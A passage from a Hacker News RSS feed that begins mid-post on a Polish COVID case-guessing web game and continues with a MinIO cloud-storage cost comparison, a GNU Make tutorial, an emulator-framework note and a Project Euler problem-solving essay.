guessers?</p><p><img src="http://blog.danieljanus.pl/img/blog/koronalotek-g2.png"></p><p>Quite accurate, in fact! Data for this plot has only been slightly preprocessed, by filtering out “unreasonable” guesses that don’t fall within the range <code>[100; 50000]</code>.</p><p>People have over- and underguesstimated the number of new cases, but not by much. There were only a&nbsp;few occasions where the actual case count didn’t fall within one standard deviation of the mean of guesses (represented by the whiskers around blue bars on the plot). Granted, the daily standard deviation tends to&nbsp;be large (on the order of a&nbsp;few thousand), but still, I’m impressed. A&nbsp;paper on estimating the growth of pandemic based on coronalottery results coming soon to&nbsp;a&nbsp;journal near you! ;-)</p><p>Just for the heck of it, I’ve also been looking at individual votes. Specifically, names. Here’s a&nbsp;snapshot of unique guessers’ names sorted by decreasing length, on 23 October. (NSFW warning: expletives ahead!)</p><p><img src="http://blog.danieljanus.pl/img/blog/koronalotek-names.jpg"></p><p>Let me translate a&nbsp;few of these for those of you who don’t speak Polish:</p><p>1 is “Sasin has fucked over 70 million zlotys for elections that didn’t take place and was never held responsible.” This alludes to&nbsp;the <a href="https://notesfrompoland.com/2020/05/27/70-million-zloty-bill-for-polands-abandoned-presidential-election/">ghost election in Poland</a> from May. This news had gone memetic, going so far as Minister Sasin’s name being ironically used as a&nbsp;dimensionless unit of 70 million (think Avogadro’s number). You’ll discover the same theme in #2, #3, #5, and others.</p><p>6 is “CT {Constitutional Tribunal}, you focking botch, stop repressing my abortion”. Just a&nbsp;day before, the Polish constitutional court (whose current legality is <a href="https://en.wikipedia.org/wiki/Constitutional_Tribunal_(Poland)#2015%E2%80%93present:_Polish_Constitutional_Court_crisis">disputed at best</a>) has <a href="https://notesfrompoland.com/2020/10/22/constitutional-court-ruling-ends-almost-all-legal-abortion-in-poland/">decreed a&nbsp;ban on almost all legal abortion</a> in Poland, giving rise to&nbsp;<a href="https://edition.cnn.com/2020/10/31/europe/poland-abortion-protests-scli-intl/index.html">the biggest street protests in decades</a>.</p><p>Not all is political: 4 is “Why study for the exam if we’re not gonna survive until November anyway?”. I&nbsp;hope whoever wrote this is alive and well.</p><p>Corollary? Give people a&nbsp;text field, and they’ll use it to&nbsp;express themselves: politically or otherwise.</p><p>In fact, I&nbsp;have taken the liberty of chiming in. Shortly after, I&nbsp;altered the thank-you page (which used to&nbsp;just say “thanks for guessing”) to&nbsp;proudly display one of the emblems of the Women’s Strike, along with a&nbsp;link to&nbsp;a&nbsp;<a href="https://zrzutka.pl/kasa-na-aborcyjny-dream-team-55g5gx">crowdfounding campaign</a> for an NGO that supports women needing abortion.</p><p><img src="http://blog.danieljanus.pl/img/blog/koronalotek-thanks.jpg"></p><h2>Inside out</h2><p>I’m not much of a&nbsp;DevOps person, so I&nbsp;deployed it the quick and dirty way, not caring about scalability or performance. The maxim “make it as simple as possible” permeates the setup.</p><p>I&nbsp;just started a&nbsp;REPL within a&nbsp;<code>screen</code> session on the tiny Scaleway C1 server that also hosts this blog and some of my other personal stuff. I&nbsp;launched a&nbsp;Jetty server within it, and set up a&nbsp;nginx proxy. And that’s pretty much it. I&nbsp;liberally tinker with the app’s state in “production,” evaluating all kinds of expressions when I&nbsp;feel like it.</p><p>Code changes are deployed by <code>git pull</code>ing new developments and doing <code>(require 'koronalotek.core :reload)</code> in the REPL.</p><p>Someone tried a&nbsp;SQL injection attack. This is doomed to&nbsp;fail because there’s no SQL involved. In fact, there’s no database at all. The entire state is kept in an in-memory atom and periodically synced out to&nbsp;an EDN file. In addition, state is reset and archived daily at the time of announcing winners. (I’ve added the archiving after forgetting it on one occasion – hence the lack of data for 19 October.)</p><p>I&nbsp;also don’t yet have a&nbsp;mechanism of automatically pulling in the Ministry of Health’s data. Every morning, I&nbsp;spend two minutes checking if there’s excess automatic votes, removing them if any, and then filling in the blanks:</p><pre><code>(new-data! #inst "2020-11-08T10:30+01:00" 24785)
</code></pre><p>For all the violations of good practices in this setup, it has worked out surprisingly well so far. I’ve resorted to&nbsp;removing automated votes a&nbsp;handful of times, and blacklisting IPs of voting bots in the nginx setup twice, but otherwise it’s been a&nbsp;low-maintenance toy. People seem to&nbsp;be willing to&nbsp;have fun, and I’m just not interfering.</p><h2>Takeaways</h2><ol><li>You should call on your country’s authorities to&nbsp;exert pressure on the Polish government to&nbsp;respect women’s choices and stop actively repressing them.</li><li>Give people a&nbsp;text field, and they’ll use it to&nbsp;express themselves.</li><li>Release early, release often.</li></ol></div></div>]]>
            </description>
            <link>http://blog.danieljanus.pl/2020/11/08/coronalotto/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026666</guid>
            <pubDate>Sun, 08 Nov 2020 16:13:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The long term costs of object storage in the public cloud]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25026660">thread link</a>) | @jtsymonds
<br/>
November 8, 2020 | https://blog.min.io/the-long-term-costs-of-storage-in-the-cloud/ | <a href="https://web.archive.org/web/*/https://blog.min.io/the-long-term-costs-of-storage-in-the-cloud/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                    <p>The promise/allure of the public cloud is based on the concept that it is elastic. One can, with little effort, scale up workloads and, if desired, scale down those same workloads. We have <a href="https://blog.min.io/repatriation_wave/">written on this subject before</a> - from the perspective of what workloads to consider as you evaluate what to take to the public cloud and what to repatriate to the private cloud. <br></p><p>We have not, however, taken a hard look at the costs associated with the two options. Our position can be related as an analogy. The public cloud is like a nice hotel. Plenty of amenities, secure, spacious etc. It is priced like a nice hotel too. As a result, people don’t live in nice hotels - they stay there for a period of time to achieve a certain objective (business trip, vacation) because it gets too expensive otherwise. <br></p><div><p>We wanted to quantify this objectively so we rolled up our sleeves, made some reasonable assumptions and wrote this post. Here we go:</p><p>If we assume that we will be using object storage in the cloud and want to understand the costs of deploying a PB of data (200TB active, 800TB inactive, with a Read:Write ratio of 80:20) we can compute what this storage would cost on various public clouds.</p></div><p>AWS S3 storage tiers costs are as follows (See <a href="https://aws.amazon.com/s3/pricing/">https://aws.amazon.com/s3/pricing/</a>). This should not be a surprise as prices have not changed in the last four years (but costs have :).<br></p><ul><li><strong>S3 Standard</strong> storage the first 50TB costs $0.023 per month per GB, the next 450TB costs $0.22 per month per GB, and all storage over 500TB costs $0.021 per month per GB. So 1PB of S3 Standard storage would cost $1.2K/month for the 1st 50TB, $9.9K/month for the next 450 TB and $10.3K/month for the next 500TB or <strong>$21.6K/month for 1PB of data</strong>.</li><li><strong>S3 Intelligent Tiering </strong>storage costs the same as S3 Standard for frequently active data and $0.0125 for infrequently accessed data plus an $0.0025 per 1000 Objects fee for management. So assuming 200TB:800TB active:inactive the active data would cost $1.2K/month for 50TB and $3.3K/month for the 150TB and $10.0K for the inactive 800TB. To that, we must add object management costs. It’s not unusual to see PB data warehouse with billions of objects/files. So if we assume 1B objects (average ~1MB/object) in our PB of data object management costs would be $2.5K per month. Totaling all that together we have an overall <strong>storage and object management costs of</strong> ~<strong>$17.0K per month for our 1PB of data</strong>. <br></li></ul><p>It is true one could do a blend of standard S3 plus S3 Glacier or S3 Glacier Deep Archive, but that doesn’t really get to the apples to apples comparison we are seeking. So for the purposes of this we will consider the first two. <br></p><p>Although Azure and GCP don’t have exactly equivalent tiers of storage, if we just focus on S3 Standard equivalents then Azure Blob and GCP cloud storage costs are:</p><ul><li>Azure (Hot) Blob storage <a href="https://azure.microsoft.com/en-us/pricing/details/storage/blobs/">costs</a> a flat $0.0184 per GB per month or $18.4K per 1PB per month, or about 85% of AWS S3 standard costs.</li><li>GCP us-central cloud storage costs are $0.020 per GB per month or $20K for 1PB per month or about 93% of what AWS S3 standard costs. <br></li></ul><p>There are some additional costs that are associated with per 1,000 S3 operations. But we estimate in the scheme of things they don’t add more than $300/month to the above costs. As such we will ignore these costs here.</p><h3 id="what-if-we-wanted-to-copy-the-data-out-of-the-cloud">What if we wanted to copy the data out of the cloud?</h3><p>Of course none of the above cloud storage costs takes into consideration any egress charges which for AWS and GCP are $0.09 to $0.05/GB per month and $0.12/GB, respectively. So if you wanted to move the active 200TB of your 1PB of data out of the (AWS or GCP) cloud each month you would need to add it would cost you another ~$14K/month (on average) with AWS S3 and $24K/month with GCP. <br></p><p>For Azure they don’t appear to have a standard egress charge but rather charge per operation and bandwidth used. We would guess (although we haven’t verified this) that the costs would be comparable to AWS S3 standard egress charges. <br></p><p>Of course there would be no direct charge to move the 1PB of data center data around. You would incur bandwidth costs depending on where you moved it. But the server costs are already accounted for in the costs above. <br></p><h3 id="the-private-cloud-onprem-equivalents-software">The Private Cloud/OnPrem Equivalents: Software</h3><p>First off, you need equivalent software. MinIO offers that (and more) with its S3 compatible, feature rich object storage suite. It is literally a private cloud, drop-in equivalent for AWS. While MinIO is open source, it does offer two tiers for the MinIO Subscription Network. SUBNET, as we call it, combines a commercial license with 24/7/365 direct-to-engineer support, security and resilience audits and other diagnostic technologies that effectively insure production deployments of our software. <br></p><p>The Standard tier is priced at .01 per GB per month and the Enterprise tier is priced at .02 per GB per month.<br></p><p>For our PB of data, that equates to 10K and 20K per month respectively. Needless to say, there is the open source option as well, which would be appropriate if your data was not mission critical. That cost is zero.</p><p>There are no egress costs. There are no per object management costs. <br></p><p>For the purposes of this exercise let’s choose the middle - the Standard plan at <strong>$10K per month for software costs.</strong></p><h3 id="the-private-cloud-onprem-equivalents-hardware">The Private Cloud/OnPrem Equivalents: Hardware</h3><p>While MinIO can run on a range of hardware from Raspberry Pis to IBM Power, we wanted to target dense JBODs for the purposes of our analysis. <br></p><p>It just so happens that through our partnership with Seagate, we have publishable pricing for a 1TB configuration of the Exos AP 2U12 (Dual AP) with two Intel Silver Xeon CPUs. It has</p><p>60 drives at 16 TB per drive delivering .96 PB raw capacity and .72 actual capacity. This assumes erasure coding factor of .75. The price for that hardware is a very reasonable $70K. Let’s choose a three year amortization schedule on that hardware to determine a monthly per GB cost. At 36 months our monthly cost for the hardware works out<strong> to $1,510 per month or $0.0015 GB/month</strong>. <br></p><p>Interested in more? Jump over to the <a href="https://min.io/product/reference-hardware#pricing-calculator">Reference Hardware page to play with the calculator</a> to see other capacities. <br></p><h3 id="don-t-forget-the-data-center-costs">Don’t Forget the Data Center Costs</h3><p>For a data center deployment, we would need to add administration, rack, space, power and cooling costs. We could go into great detail here to determine each of these costs but in general according to the US Chamber of Commerce <a href="https://www.uschamber.com/sites/default/files/ctec_datacenterrpt_lowres.pdf">data center space</a> can be had for about $1305/NRSF (net rentable square feet) in CapEx and another $112/NRSF ( ~8.6% of CapEx) in OpEx or a total of ~$1.4K/NRSF annual cost or an extra $116 per month. <br></p><h3 id="totaling-up-the-private-cloud">Totaling Up the Private Cloud</h3><p>The cost to run your own, 1 PB private cloud, with state of the art hardware, 24/7 direct-to-engineer support, panic button access and annual performance reviews is <strong>$11,510 per month</strong>. Let’s circle back and compare that to what we calculated above.</p><h3 id="summarizing-the-one-year-costs">Summarizing the One Year Costs</h3><p>At $11,510 MinIO and Seagate represent the best economics - by a considerable amount. The combination is 47% less expensive per month than standard S3 and 33% less than S3 with Intelligent Tiering. <br></p><p>These calculations ignore AWS egress costs - which would make MinIO and Seagate less than half as expensive as Standard S3. <br></p><p>MinIO and Seagate are also 38% less than Azure’s comparable option and 43% less than Google Cloud Platform’s comparable offering. <br></p><p>The breakeven point for building your own private cloud vs. S3 Standard comes in at seven months. Thought of another way - for the price of 1PB on S3 Standard you could have almost 1.5 PBs of MinIO and Seagate.</p><p><br>The overall point is not to compete on price. </p><p>We think it is a <a href="https://blog.min.io/the-new-metrics-of-object-storage/">poor metric</a> when thinking about object storage. What we seek to detail here, is that, over time, you will get better performance, superior security, more control and additional flexibility by going on prem - without sacrificing anything on cost (indeed you gain economic advantage). That is why many innovative enterprises are engaged in large scale repatriation strategies, because they realize the cloud is here to stay and they have a choice about what cloud that is - and they are picking the private cloud.</p><p>Feel free to disagree with us. You can reach out at hello@min.io. </p><p>Feel free also to put us to the test. &nbsp;You can contact a Seagate rep from the <a href="https://min.io/product/reference-hardware#pricing-calculator">calculator</a> and <a href="https://min.io/download#/macos">download our software here</a>. If you need a little help, join the 9,700 members of the Slack channel. </p>

                                    </section></div>]]>
            </description>
            <link>https://blog.min.io/the-long-term-costs-of-storage-in-the-cloud/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026660</guid>
            <pubDate>Sun, 08 Nov 2020 16:12:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introduction to Makefiles]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25026656">thread link</a>) | @ingve
<br/>
November 8, 2020 | https://xs-labs.com/en/blog/2020/11/07/introduction-to-makefiles/ | <a href="https://web.archive.org/web/*/https://xs-labs.com/en/blog/2020/11/07/introduction-to-makefiles/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<h2>Introduction to Makefiles</h2><p>
    I often use Makefiles in some of my projects.<br>
    I really like the flexibility it gives, and I often find myself writing a Makefile instead of a simple shell script to automatize tasks.
</p>
<p>
    So here's a little crash course.<br>
    I'll obviously only cover the basics, but I hope this will give you a good idea on how you could improve your workflows using Makefiles.
</p>
<h3>About Make</h3>
<p>
    Make was developed in 1976 mainly as a build automation tool, to produce executable files or libraries from source code.
</p>
<p>
    While it excels as a build system, it can also be used for a lot of different things.<br>
    If you do write shell scripts to automatize certain tasks, you'll be able to use Makefiles instead.<br>
    As we're going to see, a Makefile can have several advantages over a regular shell script.
</p>
<p>
    This tutorial will only be focused on the GNU version of Make, as it's the most widely used and the most powerful.
</p>
<h3>Basics</h3>
<p>
    First of all, when you invoke the <code>make</code> command, it will look for a file named <code>Makefile</code> in the current working directory.<br>
    This is the default, but note that a specific Makefile can be used with the <code>-f</code> flag, followed by the file name or path.
</p>
<p>
    If such a file is found, it will by default execute the <code>all</code> target.
</p>
<p>
    <strong>Make is target-based system.</strong><br>
    Your Makefile can specify multiple targets, and targets may be executed individually when invoking <code>make</code>. But more on this later.
</p>
<p>
    <strong>For now, we'll just start by creating a basic <em>hello world</em> example.</strong>
</p>
<h4>hello, world</h4>
<p>
    In some directory, create a file called <code>Makefile</code> with the following content:
</p>
<pre>all:
    
    echo "hello, world"
</pre>
<p>
    <code>all</code> is the target name. Target definitions are followed by a colon sign.<br>
    As mentioned earlier, <code>make</code> will by default look for a target called <code>all</code>. So this is our main entry point.
</p>
<p>
    Inside the target, you'll simply execute shell commands.  
    Here, we print the <em>hello, world</em> string, using the shell's builtin <code>echo</code> command.
</p>
<p>
    <strong>Note that target commands need to be indented with at least a single tab.</strong><br>
    <strong>While spaces can be used elsewhere for indentation, tabulation is mandatory inside a target.</strong>
</p>
<p>
    Now from a command prompt, <code>cd</code> to that directory and type <code>make</code>.
</p>
<p>
    <code>make</code> will read the <code>Makefile</code>, and execute the <code>all</code> target, giving the following output:
</p>
<pre>echo "hello, world"
hello, world
</pre>
<p>    
    As you can see, <code>make</code> will first print the full command, before printing any output.<br>
    This can be disabled by using an <code>@</code> sign before the command:
</p>
<pre>all:
    
    @echo "hello, world"
</pre>
<p>
    Now the output is simply:
</p>
<pre>hello, world
</pre>
<h4>Additional targets</h4>
<p>
    You can define as many targets as you want.<br>
    For instance:
</p>
<pre>all:
    
    @echo "hello, world"

foo:
    
    @echo "hello, foo"

bar:
    
    @echo "hello, bar"
</pre>
<p>
    While invoking <code>make</code> will still only execute the <code>all</code> target, the <code>foo</code> or <code>bar</code> targets can be executed individually by specifying their names:
</p>
<pre>$ make
hello, world

$ make foo
hello, foo

$ make bar
hello, bar
</pre>
<h4>Target dependencies</h4>
<p>
    A target may depend on another target, or on multiple other targets.<br>
    This is called a <strong>prerequisite</strong>.
</p>
<p>
    Prerequisites follows the target name:
</p>
<pre>foo: bar
    
    @echo "hello, foo"
</pre>
<p>
    Here, the <code>foo</code> target depends on <code>bar</code>. This means that when <code>foo</code> is about to be executed, <code>bar</code> will be executed first.
</p>
<p>
    Multiple prerequisites are simply separated by a space:
</p>
<pre>foo: bar all
    
    @echo "hello, foo"
</pre>
<p>
    Here, upon executing <code>foo</code>, <code>make</code> will start by executing <code>bar</code>, then <code>all</code>, and finally <code>foo</code>.
</p>
<p>
    And obviously, chaining works too:
</p>
<pre>all: foo
    
    @echo "hello, world"

foo: bar
    
    @echo "hello, foo"

bar:
    
    @echo "hello, bar"
</pre>
<p>
    <code>all</code> depends on <code>foo</code>, which depends on <code>bar</code>. So when invoking <code>make</code>, you'll get the following output:
</p>
<pre>hello, bar
hello, foo
hello, world
</pre>
<p>    
    And you can also manually execute <code>foo</code> by typing <code>make foo</code>, which will give:
</p>
<pre>hello, bar
hello, foo
</pre>
<h4>Error handling</h4>
<p>
    <strong>A very nice thing about <code>make</code> is that it does error handling for you.</strong><br>
    If a command returns a <strong>non-zero</strong> exit status, <code>make</code> will report the error and <strong>abort execution</strong>.
</p>
<p>
    This means that if a command fails inside some target (which may be a prerequisite of another target), the whole execution will stop.<br>
    So you don't have to do any manual error checking, as you would/should do with a shell script.
</p>
<p>
    For instance:
</p>
<pre>all: foo
    
    @echo "hello, world"

foo: bar
    
    @echo "hello, foo"

bar:
    
    @echo "Executing false"
    @false
    @echo "hello, bar"
</pre>
<p>
    Note that in the <code>bar</code> target, we execute the shell's <code>false</code> command, which always returns a non-zero exit status.<br>
    Now if we invoke <code>main</code>, we'll get the following output:
</p>
<pre>Executing false
make: *** [bar] Error 1
</pre>
<p>
    <code>make</code> will execute <code>all</code>, which needs to execute <code>foo</code>, which needs to execute <code>bar</code>.  
    <code>bar</code> will print the first message, and then execute the <code>false</code> command.
</p>
<p>
    As it returns a non-zero exit status, this is detected as an error, and execution is stopped.<br>
    The remaining message in <code>bar</code> will not be printed, and the <code>foo</code> and <code>all</code> targets won't be executed.
</p>
<h4>Debugging</h4>
<p>
    Also note that you can obtain detailed informations about how <code>make</code> reads your Makefile using the <code>--debug</code> flag.<br>
    With the previous example:
</p>
<pre>$ make --debug
Reading makefiles...
Updating goal targets....
    File `all' does not exist.
        File `foo' does not exist.
            File `bar' does not exist.
        Must remake target `bar'.
Executing false
make: *** [bar] Error 1
</pre>
<h4>Variables</h4>
<p>
    You can also define variables inside your Makefile.<br>
    Variables are defined outside targets, and can be referred to with a <code>$</code> sign and parenthesis:
</p>
<pre>HELLO := hello, world

all:

    @echo "$(HELLO)"
</pre>
<p>
    Variables may also be overridden when invoking <code>make</code>, giving extra flexibility.<br>
    For instance, with the example above:
</p>
<pre>$ make HELLO="This is a test"
This is a test
</pre>
<p>
    We'll cover more about variables later.
</p>
<h3>Real life example - Build system</h3>
<p>
    <strong>Now that we have covered the basics, let's take a more useful example.</strong>
</p>
<p>
    We'll create a simple build system for the C programming language.<br>
    The goal is to compile C source files, and to produce an executable.
</p>
<p>
    We'll start by a very simple build system, and work on it step by step to achieve a more generic one.
</p>
<h4>Project structure</h4>
<p>
    Here's the basic project structure:
</p>
<ul>
    <li><code>build</code> (directory)</li>
    <li><code>Makefile</code></li>
    <li>
        <code>source</code> (directory)
        <ul>
            <li><code>main.c</code></li>
        </ul>
    </li>
</ul>

<p>
    We have a <code>build</code> directory for the final executable and temporary files, the Makefile, and a <code>source</code> directory with a single <code>main.c</code> file.
</p>
<p>
The <code>main.c</code> file is a basic <em>hello world</em> program:
</p>
<pre>#include &lt;stdio.h&gt;

int main( void )
{
    printf( "hello, world\n" );
    
    return 0;
}
</pre>
<h4>Producing a simple executable</h4>
<p>
    We'll start with a very simple <code>Makefile</code> that invokes the <code>clang</code> C compiler.<br>
    You can obviously replace it with <code>gcc</code> if you want:
</p>
<pre>all:
    
    @clang -Wall -Werror source/main.c -o build/main
</pre>
<p>
    When invoking <code>make</code>, it will compile the <code>source/main.c</code> and produce an executable in <code>build/main</code>.<br>
    Dead simple.
</p>
<h4>Compiling multiple files</h4>
<p>
    Now let's say we want to compile multiple C files to produce the executable.
</p>
<p>
    We'll first create a function named <code>hello</code> in the <code>source/hello.c</code> file:
</p>
<pre>#include &lt;stdio.h&gt;
#include "hello.h"

void hello( void )
{
    printf( "hello, world\n" );
}
</pre>
<p>
    And we'll also add the corresponding header in <code>source/hello.h</code> with the function prototype:
</p>
<pre>#ifndef HELLO_H
#define HELLO_H

void hello( void );

#endif
</pre>
<p>
    Our <code>main.c</code> file will then call the <code>hello</code> function:
</p>
<pre>#include "hello.h"

int main( void )
{
    hello();
    
    return 0;
}
</pre>
<p>
    Now the <code>Makefile</code> could simply be:
</p>
<pre>all:

    @clang -Wall -Werror source/hello.c source/main.c -o build/main
</pre>
<p>
    However, this is not really flexible, and this is usually not how individual files are compiled.<br>
    Instead, we'll produce an <strong>object file</strong> for each C source file, and <strong>link them together</strong> to produce the final executable:
</p>
<pre>all:

    @clang -Wall -Werror -c source/hello.c -o build/hello.o
    @clang -Wall -Werror -c source/main.c -o build/main.o
    @clang -Wall -Werror build/hello.o build/main.o -o build/main
</pre>
<p>
    Note the additional <code>-c</code> flag, needed to tell the compiler to produce an unlinked object file, instead of an executable.
</p>
<p>
    But we obviously want the compilation to happen in separate targets, so we'll create a specific target for each C source file.<br>
    The <code>all</code> target will depend on these, and be responsible for linking the executable:
</p>
<pre>all: main hello
    
    @clang -Wall -Werror build/hello.o build/main.o -o build/main
    
main:
    
    @clang -Wall -Werror -c source/main.c -o build/main.o
    
hello:
    
    @clang -Wall -Werror -c source/hello.c -o build/hello.o
</pre>
<p>
    Also notice that the compiler flags (<code>-Wall -Werror</code>) are now repeated in each target.<br>
    Time to create a variable:
</p>
<pre>CFLAGS := -Wall -Werror

all: main hello
    
    @clang $(CFLAGS) build/hello.o build/main.o -o build/main
    
main:
    
    @clang $(CFLAGS) -c source/main.c -o build/main.o
    
hello:
    
    @clang $(CFLAGS) -c source/hello.c -o build/hello.o
</pre>
<p>
    This is obviously better, and it also mean we can now override the compiler flags when invoking <code>make</code>:
</p>
<pre>$ make CFLAGS=-Weverything
</pre>
<p>
    It might also be a good idea to create a variable for the compiler itself:
</p>
<pre>CC     := clang
CFLAGS := -Wall -Werror

all: main hello
    
    @$(CC) $(CFLAGS) build/hello.o build/main.o -o build/main
    
main:
    
    @$(CC) $(CFLAGS) -c source/main.c -o build/main.o
    
hello:
    
    @$(CC) $(CFLAGS) -c source/hello.c -o build/hello.o
</pre>
<p>
    So if you want to use <code>gcc</code> instead of <code>clang</code>, you can simply use:
</p>
<pre>$ make CC=gcc
</pre>
<p>
    And we should also add some output:
</p>
<pre>    
CC     := clang
CFLAGS := -Wall -Werror

all: main hello
    
    @echo "Linking executable"
    @$(CC) $(CFLAGS) build/hello.o build/main.o -o build/main
    
main:
    
    @echo "Compiling main.c"
    @$(CC) $(CFLAGS) -c source/main.c …</pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://xs-labs.com/en/blog/2020/11/07/introduction-to-makefiles/">https://xs-labs.com/en/blog/2020/11/07/introduction-to-makefiles/</a></em></p>]]>
            </description>
            <link>https://xs-labs.com/en/blog/2020/11/07/introduction-to-makefiles/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026656</guid>
            <pubDate>Sun, 08 Nov 2020 16:12:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Emulator Framework – EMF]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25026602">thread link</a>) | @lsferreira42
<br/>
November 8, 2020 | http://em.ulat.es/info.php | <a href="https://web.archive.org/web/*/http://em.ulat.es/info.php">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>
                        The Emulator Framework was conceived, designed, and implemented by Steven Goodwin, between 2011 and 2020.
                    </p>
                    <p>
                        It is a system to build emulators, assemblers, disassemblers, and assorted tools
                        using a single description language.
                    </p>
                    <p>
                        The code is too much of a 'work in progress' to release, at the moment, but will
                        find its way onto Github at some point. But you can see the resultant examples on 
                        these pages. It truly does work!
                    </p>
                    <p>
                        Contact: MarquisdeGeek@gmail.com
                    </p>
                   <!-- INCLUDE:COPYRIGHT -->
                </div></div>]]>
            </description>
            <link>http://em.ulat.es/info.php</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026602</guid>
            <pubDate>Sun, 08 Nov 2020 16:04:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Problem Solving Techniques]]>
            </title>
            <description>
<![CDATA[
Score 162 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25026561">thread link</a>) | @denvaar
<br/>
November 8, 2020 | https://denvaar.github.io/articles/problem_solving_example.html | <a href="https://web.archive.org/web/*/https://denvaar.github.io/articles/problem_solving_example.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>âœ�ï¸� Going meta - Working through a programming problem to understand problem solving techniques.</p><div>
        <p>The technical skills of computer programming fall under two broad categories, in my opinion.</p>
<p>The first category includes things like learning language syntax, constructs, and patterns. I would summarize it as the ability to connect and utilize the myriad, "tools of the trade" -- languages, frameworks, APIs, libraries -- to create software. There's usually tutorials for these things.</p>
<p>The second category includes things that are a little bit harder to put your finger on, but can probably be best described as problem solving. It's the ability to analyze, troubleshoot, debug, or solve a problem. It's the ability to reason with abstract ideas and turn them into code.</p>
<p>There is for sure some overlap between these two categories, but this is how I like to think about it.</p>
<p>It's hard to be specific about what it takes to be good at problem solving. I believe that's because we all have a slightly different perception of the world around us. Everyone learns differently. There must, however, be at least some techniques that I might learn from you, and vice versa.</p>
<p>Problems like the one I am about to share can be great tools for learning about problem solving. This one's from Project Euler. My intention is not to simply spoil the answer. I want to share my process of figuring it out, with the hope of being able to pinpoint some specific strategies that can be used to solve all kinds of problems.</p>
<h2 id="thechallenge">The challenge</h2>
<p>You can find the original problem statement <a href="https://projecteuler.net/problem=79">here</a>. It's short, so take a moment to read through.</p>
<p><img src="https://denvaar.github.io/assets/secret_number_0.png" alt=""></p>
<p>The challenge is to determine what the shortest possible secret number is. Here's an excerpt from the keylogger file.</p>
<pre><code>...
160
689
716
731
736
...
</code></pre>
<h2 id="firststeps">First steps</h2>
<p>I began by sitting down with pencil and paper to write some numbers from the list. Writing helps me begin to think about the problem.</p>
<p>I thought about what these numbers in the list could tell me about the secret number. Maybe I could find a way to at least figure out its length. There are about fifty numbers in the list, so maybe that number is somehow correlated to the secret number.</p>
<p>These were a few of the questions going through my head. If the answers seem super obvious to you, then congratulations, you might be smarter than me. What's most important during the first steps is that you ask questions.</p>
<p>I realized pretty quickly that no, the length of the list I was given didn't tell me much, but you've got to start somewhere. Next, my thoughts turned to the fact that each number was three digits long.</p>
<p><em>What if I was given a list of two-digit numbers, or even a list of just one-digit numbers? What could that tell me about the length of the secret number? Is there something special about three-digit numbers in particular?</em> These were valuable questions to ask, because it helped me to simplify the problem.</p>
<p>I made a list of one-digit numbers and tried to think about how I might be able to solve the same problem with that instead.</p>
<pre><code>6
2
1
0
</code></pre>
<p>Given a list like this as clues, I could say for certain that the secret number has at least a 6,2,1, and 0, but I also loose essential information about the problem: The order that the numbers appear in. A list of one-digit numbers is too ambiguous. The secret number could be <code>6210</code>, <code>2601</code>, or any other combination, and I would have no way of knowing which one is correct.</p>
<p>A list of two-digit numbers might be nice. It's less to think about, yet is still able to convey the needed information. From this point forward, I decided to think about the list as two-digit numbers, rather than three-digit numbers.</p>
<h2 id="possibleoptionmaintainasortedarray">Possible option: Maintain a sorted array</h2>
<p>At this point, I still wasn't sure how to solve the problem on paper, so I decided to try and work backwards. I wrote down a random number and then picked a few pairs of digits from it to try and reconstruct my own version of the problem. I decided to go through each number in the list and write down the digits as if they were being inserted into some kind of array.</p>
<p><img src="https://denvaar.github.io/assets/secret_number_1.png" alt=""></p>
<p>I realized an approach like this would not be very practical because it still leaves room for ambiguity.</p>
<p>In the example above, its clear that 5 is before 2, but if I continue to add the digits from the next number, I can't tell if the 1 should come before or after the 5. It's the same problem for the 8: I know it should come before the 2, but the data says nothing about if it should be before or after the 1, or the 5.</p>
<p>Even if I had another data point to disambiguate the clues -- <code>51</code>, for example -- sure, it would tell me that the 1 is in the correct spot between 5 and 2, but I already get the feeling that trying to write code to account for switching numbers around in an array is not going to be practical, and that there is probably an easier way.</p>
<p>Writing it out this way helped me realize that the help of some sort of data structure would be useful for solving this problem.</p>
<p>So now the question is, <em>what kind of data structure could help model this problem?</em> To help with this decision, I thought about what data is actually provided in the problem. Using the example above, the list of numbers reads as:</p>
<ul>
<li>5 "comes before" 2</li>
<li>1 "comes before" 2</li>
<li>8 "comes before" 2</li>
</ul>
<p>Each number in the list provides helpful clues, but the problem is that it's difficult to keep track of how each clue ultimately fits together. I tried to think of some kind of data structure that would be able to represent each clue individually, but also as a whole.</p>
<p>A directed graph seems to be a pretty natural fit to represent this information. Each node could be a digit, and the edges between nodes could represent the relationship between them.</p>
<p><img src="https://denvaar.github.io/assets/secret_number_2.png" alt=""></p>
<p>I felt good about using a graph to solve the problem, but there were still some questions that I had to figure out.</p>
<ul>
<li>How would I know when the graph has enough information to to be able to get the secret number? In other words, how can I know when my answer is conclusive?</li>
<li>How could the graph be read or interpreted programmatically to produce the secret number?</li>
<li>What if a secret number had more than one of the same digit? Would that ruin my approach?</li>
</ul>
<h2 id="howtoknowwhentheanswerisconclusive">How to know when the answer is conclusive</h2>
<p>To help answer this question I used the same technique of creating a simplified version of the problem and working backwards. Pretend now that 157 is the secret number. How many edges between the nodes would it take to definitively say that 1 comes before both 5 and 7, and 5 comes before 7? The answer is three edges for this particular graph.</p>
<p><img src="https://denvaar.github.io/assets/secret_number_3.png" alt=""></p>
